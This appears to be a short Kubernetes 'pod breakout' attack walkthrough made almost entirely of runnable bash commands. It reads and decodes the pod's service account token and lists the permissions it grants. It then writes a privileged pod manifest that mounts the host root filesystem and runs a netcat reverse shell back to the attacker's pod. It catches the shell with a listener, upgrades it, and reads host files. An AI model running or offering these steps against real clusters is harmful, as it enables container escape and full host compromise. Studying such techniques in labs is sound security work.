# Pod Breakout 
```bash
# Check shell
echo $SHELL
# or
cat /etc/shells

PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

echo "Useful tools:"; missing=""; for i in kubectl hostname perl python python3 dpkg bash sh yq jq nmap curl wget ping apt apk openssl nc netcat sed vim vi nano base64 tar; do command -v "$i" >/dev/null 2>&1 && echo "$i" || missing="$missing $i"; done; if [ -n "$missing" ]; then echo  "Missing tools: $(echo "$missing" | sort)"; fi

apt update && apt install jq curl -y

LOS_KUBE_VERSION="v1.30.0" ; curl -LO https://dl.k8s.io/release/$LOS_KUBE_VERSION/bin/linux/amd64/kubectl && chmod +x kubectl && mv ./kubectl /usr/bin/ ; kubectl version

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)  ; jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $TOKEN


kubectl auth can-i --list


```

```bash
# This time lets try the last manifest and see if we can create a pod in the kube-system namespace

LOS_IP=$(hostname -i);PODNAME="loworbit-pod.yaml"

cat << EOF > $PODNAME 
apiVersion: v1
kind: Pod
metadata:
  name: loworbit-pwnd
  namespace: kube-system # Edit this to be what you want
  labels:
    app: loworbitsecurity 
spec:
  containers:
  - name: pwnd-container
    image: ubuntu 
    command:
      - /bin/sh
      - -c
      - |
        apt update && apt install -y iputils-ping && ping $LOS_IP
  restartPolicy: Always
EOF
```


```bash
# This will not work
kubectl apply -f $PODNAME
```


```bash
# Install netcat
apt update && apt install netcat-traditional

# Set hostname and pod variable
LOS_IP=$(hostname -i);PODNAME="loworbit-pod.yaml"

# Write manifest without vi :(
cat << EOF > $PODNAME
apiVersion: v1
kind: Pod
metadata:
  name: loworbit-pwnd
  labels:
    app: loworbitsecurity
spec:
  containers:
  - name: pwnd-container
    image: ubuntu
    command:
      - /bin/bash  # Use bash for apt and netcat
      - -c
      - |
        apt update && apt install -y python3 netcat-traditional &&
        /bin/nc -nv $LOS_IP 4444 -e /bin/bash  
    securityContext:
      privileged: true 
    volumeMounts:
    - name: host-root
      mountPath: /hostfs 
      readOnly: false 
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  restartPolicy: Always
EOF
```

```bash
kubectl apply -f $PODNAME ; nc -nvlp 4444

# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Set sane prompt
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

# Check out the host fs
ls /hostfs

cat /hostfs/etc/hostname

# If the pod doesn't die on it's own
kubectl delete -f loworbit-pwnd --force

```
